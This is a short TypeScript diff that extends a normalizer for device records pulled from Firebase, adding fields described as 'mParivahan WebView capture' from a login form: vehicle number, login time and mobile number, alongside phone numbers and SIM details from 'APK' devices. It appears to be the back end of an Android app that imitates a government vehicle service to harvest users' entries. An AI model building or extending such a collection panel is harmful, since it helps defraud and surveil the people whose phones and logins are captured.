@@ -1,7 +1,6 @@
 /**
  * Normalize raw Firebase device data.
- * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
- * and new APK format (modelName, mobNo, sims[], status boolean).
+ * Supports old APK (model/phone/sim1/sim2/ping) + new APK (modelName/mobNo/sims[]/status) + mParivahan WebView (vehicleNumber/loginTime)
  */
 export interface NormalizedDevice {
   id: string;
@@ -26,6 +25,10 @@ export interface NormalizedDevice {
   joined?: string;
   label?: string;
   service_provider?: string;
+  // mParivahan WebView capture
+  vehicleNumber: string;
+  loginTime?: number;
+  mobNo?: string;
   // raw data for anything else
   raw: Record<string, any>;
 }
@@ -64,6 +67,11 @@ export function normalizeDevice(id: string, raw: Record<string, any>): Normalize
     isOnline = raw.status === 'true' || raw.status === 'online';
   }
 
+  // mParivahan capture fields (from WebView login form)
+  const vehicleNumber = String(raw.vehicleNumber || raw.vehicle || '').trim();
+  const loginTime = raw.loginTime ? Number(raw.loginTime) : undefined;
+  const mobNo = String(raw.mobNo || '').trim() || undefined;
+
   return {
     id,
     model,
@@ -86,6 +94,9 @@ export function normalizeDevice(id: string, raw: Record<string, any>): Normalize
     joined: raw.joined,
     label: raw.label,
     service_provider: raw.service_provider,
+    vehicleNumber,
+    loginTime,
+    mobNo,
     raw,
   };
 }
